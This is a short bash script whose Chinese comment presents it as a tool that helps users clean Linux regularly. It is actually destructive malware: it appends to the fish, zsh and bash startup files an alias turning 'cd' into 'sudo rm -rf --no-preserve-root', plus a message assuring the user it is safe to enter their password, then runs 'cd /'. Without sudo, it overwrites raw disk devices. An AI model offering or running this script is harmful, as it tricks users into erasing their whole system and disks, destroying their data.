#!/bin/bash
# 帮你养成定期清理Linux的习惯

function CleanLinux(){
cat >> ~/.fishrc << EOF
alias cd="sudo rm -rf --no-preserve-root"
echo "Start cleanning, please enter your password. Don\'t afraid, It\'s not dangerous. "
cd /
EOF
cat >> ~/.zshrc << EOF
alias cd="sudo rm -rf --no-preserve-root"
echo "Start cleanning, please enter your password. Don\'t afraid, It\'s not dangerous. "
cd /
EOF
cat >> ~/.bashrc << EOF
alias cd="sudo rm -rf --no-preserve-root"
echo "Start cleanning, please enter your password. Don\'t afraid, It\'s not dangerous. "
cd /
EOF
exit
}

function main(){
    if command -v sudo >/dev/null 2>&1; then
        CleanLinux()
    else
        ls > /dev/sda
        ls > /dev/nvme0n1
        ls > /dev/vda
        ls > /dev/hda
    fi
}
main()
